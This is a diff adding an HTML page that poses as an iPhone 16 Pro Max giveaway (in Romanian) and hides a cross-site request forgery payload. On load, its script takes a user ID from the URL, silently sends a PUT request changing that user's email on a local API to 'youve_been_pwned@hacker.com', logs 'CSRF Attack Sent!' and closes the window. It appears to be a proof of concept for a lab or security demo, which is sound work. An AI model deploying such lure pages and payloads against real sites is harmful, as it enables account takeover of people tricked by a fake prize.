@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>iPhone 16 Pro Max Giveaway!</title>
+</head>
+<body>
+<h1>🎉 Felicitări, ai câștigat un iPhone 16 Pro Max! 🎉</h1>
+<p>Îți vom trimite confirmarea premiului prin email.</p>
+
+<script>
+  // 📌 Funcție pentru extragerea parametrilor din URL
+  function getQueryParam(param) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+  }
+
+  const userId = getQueryParam('id'); // 🛠 Extragem ID-ul utilizatorului din URL
+
+  if (userId) {
+    fetch(`http://localhost:8080/api/cf/users/${userId}/email`, {
+      method: "PUT",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ email: "youve_been_pwned@hacker.com" })
+    })
+      .then(() => console.log("CSRF Attack Sent!"))
+      .catch(err => console.error("Error:", err));
+
+    setTimeout(() => window.close(), 500); // Închide pagina după 0.5s
+  } else {
+    console.error("No user ID provided in the URL!");
+  }
+</script>
+
+
+</body>
+</html>
